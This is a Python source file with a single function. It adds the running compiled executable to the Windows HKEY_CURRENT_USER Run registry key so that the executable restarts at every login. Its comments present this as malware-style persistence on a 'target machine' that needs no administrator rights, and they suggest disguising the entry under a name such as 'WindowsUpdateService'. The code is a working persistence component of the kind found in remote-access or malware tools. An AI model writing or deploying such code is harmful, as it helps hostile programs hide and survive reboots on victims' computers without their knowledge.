import winreg
import sys
import os

# The specific registry key malware often uses for user-level persistence.
# This key is automatically run when the current user logs in.
RUN_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

def add_to_registry(key_name: str) -> str:
    """
    Adds the currently running executable to the Windows startup registry.
    This method provides persistence across reboots for the current user.

    Args:
        key_name: The name for the new registry entry (e.g., "WindowsUpdateService").
                  This is the name that will appear in Task Manager's startup tab.

    Returns:
        A status message indicating success or failure.
    """
    # sys.executable gives the full path to the currently running .exe
    # This is crucial for making it work after being compiled by PyInstaller.
    exe_path = sys.executable

    # This check ensures the function is only used with compiled executables,
    # as persisting a .py script path is generally not useful on a target machine.
    if not exe_path.endswith('.exe'):
        return "❌ Persistence via registry is only effective for compiled .exe files."

    try:
        # Open the specified registry key.
        # HKEY_CURRENT_USER (often abbreviated as HKCU) is a root key that stores
        # settings specific to the currently logged-in user.
        # This is often targeted by malware as it doesn't require admin rights to modify.
        # winreg.KEY_ALL_ACCESS provides the necessary permissions to write to the key.
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY_PATH, 0, winreg.KEY_ALL_ACCESS)
        
        # Set (or overwrite) the value in the open key.
        # This creates a new entry where the 'key_name' (e.g., "WindowsUpdateService")
        # points to the full path of our executable.
        # REG_SZ specifies a standard null-terminated string value, which is correct for file paths.
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, f'"{exe_path}"') # Quoting path for safety
        
        # Always close the key handle to free up system resources and finalize the change.
        winreg.CloseKey(key)
        
        return f"✅ Successfully created persistence registry key '{key_name}' pointing to '{exe_path}'."

    except FileNotFoundError:
        # This error is unlikely for the HKCU Run key but is good practice to handle.
        return f"❌ Error: Registry key path not found: HKEY_CURRENT_USER\\{RUN_KEY_PATH}"
    except PermissionError:
        # This could happen if security software or system policies block registry modification.
        return "❌ Error: Permission denied. This may require administrative privileges or be blocked by security software."
    except Exception as e:
        # A catch-all for any other unexpected issues with the winreg module.
        return f"❌ An unexpected error occurred with the registry: {e}"